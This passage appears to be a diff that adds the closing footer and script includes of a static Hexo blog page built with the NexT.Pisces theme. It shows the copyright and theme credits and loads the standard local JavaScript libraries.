+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
